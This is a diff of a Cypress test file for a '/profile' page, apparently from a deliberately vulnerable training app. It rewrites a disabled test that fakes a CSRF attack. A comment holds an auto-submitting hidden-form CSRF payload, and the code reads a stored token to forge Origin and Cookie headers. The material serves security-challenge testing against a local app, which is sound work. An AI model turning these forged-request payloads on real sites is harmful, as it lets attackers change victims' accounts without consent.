@@ -76,7 +76,7 @@ describe("/profile", () => {
       cy.visit("http://htmledit.squarefree.com");
       /* The script executed below is equivalent to pasting this string into http://htmledit.squarefree.com: */
       /* <form action="http://localhost:3000/profile" method="POST"><input type="hidden" name="username" value="CSRF"/><input type="submit"/></form><script>document.forms[0].submit();</script> */
-      let document:any;
+      let document: any;
       cy.window().then(() => {
         document
           .getElementsByName("editbox")[0]
@@ -96,28 +96,24 @@ describe("/profile", () => {
 
     xit("should be possible to fake a CSRF attack against the user profile page", () => {
       cy.visit("/");
-      cy.window().then(() => {
-        const xhttp = new XMLHttpRequest();
-        xhttp.onreadystatechange = function () {
-          if (this.status === 200) {
-            console.log("Success");
-          }
-        };
-
+      cy.window().then(async () => {
         const formData = new FormData();
         formData.append("username", "CSRF");
 
-        xhttp.open("POST", `${Cypress.env("baseUrl")}/profile`);
-        xhttp.setRequestHeader(
-          "Content-type",
-          "application/x-www-form-urlencoded"
-        );
-        xhttp.setRequestHeader("Origin", "http://htmledit.squarefree.com"); // FIXME Not allowed by browser due to "unsafe header not permitted"
-        xhttp.setRequestHeader(
-          "Cookie",
-          `token=${localStorage.getItem("token")}`
-        ); // FIXME Not allowed by browser due to "unsafe header not permitted"
-        xhttp.send(formData); //eslint-disable-line
+        const response = await fetch(`${Cypress.env("baseUrl")}/profile`, {
+          method: "POST",
+          cache: "no-cache",
+          headers: {
+            "Content-type": "application/x-www-form-urlencoded",
+            Authorization: `Bearer ${localStorage.getItem("token")}`,
+            Origin: "http://htmledit.squarefree.com", // FIXME Not allowed by browser due to "unsafe header not permitted"
+            Cookie: `token=${localStorage.getItem("token")}`, // FIXME Not allowed by browser due to "unsafe header not permitted"
+          },
+          body: formData,
+        });
+        if (response.status === 200) {
+          console.log("Success");
+        }
       });
       // cy.expectChallengeSolved({ challenge: 'CSRF' })
     });
